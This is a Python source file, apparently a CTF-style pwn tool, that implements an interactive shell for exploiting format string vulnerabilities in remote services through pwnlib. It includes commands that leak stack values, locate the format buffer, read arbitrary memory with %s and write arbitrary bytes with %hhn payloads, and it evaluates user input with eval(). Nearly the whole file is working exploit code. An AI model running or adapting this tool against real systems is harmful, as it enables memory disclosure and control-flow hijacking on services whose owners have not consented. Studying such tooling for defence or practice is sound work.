import shell
import pwnlib
import pwnlib.tubes
import re

import math

from shell import Command

import logging

class NoConnectionException(Exception):
    pass

class PrintfShell(shell.Shell):
    def __init__(self,
                read, write,
                marker=b"$ ",
                conn=None,
                initial_marker=None,
                prefix_response=None,
                minlength=1):
        shell.Shell.__init__(self)
        self.read = read
        self.write = write
        self.conn = conn
        self.initial_marker = initial_marker
        self.marker = marker
        # minlength is the length when the %{n}d format string starts working
        # 0 always requires special handling, so minlength needs to be at least 1
        self.minlength = minlength 
        if initial_marker == None:
            self.initial_marker = self.marker
        self.prefix = prefix_response
        # Stack Offset is the first argument index. THat is
        # printf("%{self.stack_offset}$s") will print the format string.
        self.stack_offset = None
        # This is the location of the top of the stack
        self.stack_base = None
        # format location is the memory address of the start of the format string buffer
        self.format_location = None

    @Command
    def set_marker(self, marker):
        self.marker = marker

    @Command
    def set_initial_marker(self, marker):
        self.initial_marker = marker


    @Command
    def raw(self, *args):
        print(args)
        text = b" ".join(bytes(arg, "ascii") for arg in args)
        self.conn.send(text+b"\n")
        result = self.conn.recv()
        print(result)
        return result

    @Command
    def set_offset(self, n : int):
        self.stack_offset = int(n)

    @Command
    def connect(self, address, port):
        port = int(port)
        self.conn = pwnlib.tubes.remote.remote(address, port)
        #logging.info(f"Connected. Awaiting '{self.initial_marker}'")
        if self.initial_marker != b"":
            self.conn.recvuntil(self.initial_marker)
        self.stack_base = None
        self.stack_offset = None
        self.format_location = None
        print(self.conn)
    
    def read_response(self, string):
        marker = self.marker
        string = self.write(string)
        #print("Sending", string)
        self.conn.send(string)
        if self.prefix:
            #print("Waiting for", self.prefix)
            self.conn.recvuntil(self.prefix)
        resp = self.conn.recvuntil(marker)
        #print(resp, resp[:-len(marker)])
        return self.read(resp[:-len(marker)])
    
    @Command
    def show_stack(self, n : int):
        n = int(n)
        if not self.conn:
            raise NoConnectionException("You need to connect first")
        stack = []
        for i in range(1, n+1):
            value = self.read_response(bytes(f"%{i}$p\x00", 'ascii'))
            stack.append(value)
        for index, value in enumerate(stack):
            if value == b"(nil)":
                value = b"0x0"
            #print(value)
            _, value = value.strip().split(b"0x")
            bs = int(value, 16).to_bytes(8, byteorder="little")
            print(f"{index+1:<4} {str(value, 'ascii'):<16} {repr(bs)}")
        return stack
    
    @Command
    def disasm_at(self, addr : int, n : int):
        addr = int(addr, 16)
        bs = self.read_bytes(addr, n)
        print(pwnlib.asm.disasm(bs,arch="amd64", vma=addr))

    @Command
    def set_stack_base(self, addr : int):
        addr = int(addr, 16)
        top_page = (addr // 4096) * 4096 + 4096
        self.stack_base = top_page

    def pad(self, s, n, pad):
        padn = (n - len(s) % n) % n
        pad = pad*padn
        return s + pad

    @Command
    def interact(self):
        self.conn.interactive() 

    @Command
    def find_memory_location(self):
        if self.stack_offset is None:
            print("Need to set stack offset") # TODO: guess actual value : guess stack base
            return
        if self.stack_base is None:
            print("Need to set stack base") # TODO: guess actual value : guess stack base
            return
        watchword = pwnlib.util.packing.p64(0xdeadbeefdeadbeef)
        start = self.stack_base
        print(f"Start looking at {hex(start)}")
        for i in range(8, 4096,8):
            command = bytes(f"%{self.stack_offset+1}$s", "ascii")
            command = self.pad(command, 8, b"\x00")
            command += pwnlib.util.packing.p64(start - i)
            command += watchword
            print(f"sending {command}")
            res = self.read_response(command)
            if res == watchword + b"\n":
                self.format_location = start - i - 2*8
                print("Found stack at", hex(self.format_location))
                return
        print("Not found")
    
    @Command
    def write_byte(self, addr :int, n : int):
        if type(addr) == str:
            addr = int(addr, 16)
        n = int(n)
        addr = pwnlib.util.packing.p64(addr)
        print("Writing", n, "to", hex(pwnlib.util.packing.u64(addr)))
        if n >= self.minlength:
            command = bytes(f"%{n}d%{self.stack_offset+2}$hhn\x00", "ascii")
        else:
            # 0 needs to be special, but somtimes the value of the default
            # n register is longer than 1 character when rendered, so we
            # just pad in this case.
            # TODO: handle pad buffer spill over.
            command = bytes(" "*n+f"%{self.stack_offset+2}$hhn\x00", "ascii")
        command = self.pad(command, 16, b"\x00")
        command += addr
        print(command)
        self.read_response(command) # don't really need to read it beyond housecleaning

    @Command
    def write_bytes(self, addr : int, bs : list):
        if type(addr) == str or type(addr) == bytes:
            addr = int(addr, 16)
        bs = eval(f"b'{bs}'")
        print("Writing", bs)
        for i, b in enumerate(bs):
            self.write_byte(addr+i, b)

    @Command
    def write_n_bytes(self, addr : int, bs : list):
        if type(addr) == str or type(addr) == bytes:
            addr = int(addr, 16)
        count = 0
        total = 2*len(bs)
        command = bytes("", 'ascii')
        print(bs)
        for i, n in enumerate(bs):
            spill = (n - count) % 256
            if spill != 0:
                command += bytes(f"%1${spill}c%{self.stack_offset+total+i}$hhn", 'ascii')
            else: 
                command += bytes(f"%{self.stack_offset+total+i}$hhn", 'ascii')
            count = n
        command = self.pad(command, (total)*8, b"_") # TODO: figure out the whole sep char
        for i in range(len(bs)):
            addr_bytes = pwnlib.util.packing.p64(addr + i)
            command += addr_bytes
        print(command)
        self.read_response(command)
            

    @Command
    def read_bytes(self, addr : int, n : int):
        if self.stack_offset is None:
            print("need to set the stack offset `set_offset`")
            return  
        def read_command(stack_offset):
            command = bytes(f"%{self.stack_offset+stack_offset}$s", "ascii")
            padn = (8 - len(command) % 8) % 8
            pad = b"\x00"*padn
            return command + pad
        n = int(n)
        if type(addr) != int:
            addr = int(addr,16)
        all_bytes = b""
        offset = 0
        while len(all_bytes) < n:
            suffix = pwnlib.util.packing.p64(addr + offset)
            if b"\x0a" in suffix:
                if self.format_location is None:
                    print("Skipping 0xa location")
                    all_bytes += b"\x00"
                    offset += 1
                    continue
                # 4 (1) target_address (contains 0xa's)
                # 3 JUNKJUNK # newlines of write
                # 2 address of (1)
                # 1 extra padding of format_specifier
                # 0 format_specifier
                locations = []
                for i, c in enumerate(suffix):
                    if c == 0xa:
                        locations.append(i)
                new_suffix = suffix.replace(b"\x0a",b"\x01")
                # put modded suffix on stack
                self.read_response(b"\x00"*(4*8)+new_suffix)
#
                # replace all bytes in suffix
                for i in locations:
                    self.write_byte(self.format_location + 4*8 + i, 0xa)
                # set command to read from the 4th thing on stack
                command = read_command(4)
            else:
                command = read_command(1) + suffix
            res = self.read_response(command)
            res = res + b"\x00"
            all_bytes += res
            offset = len(all_bytes)
        print(all_bytes)
        return all_bytes

if __name__ == "__main__":
    shell = PrintfShell(read=lambda x: x, write=lambda x:x+b"\n")
    shell.runloop()
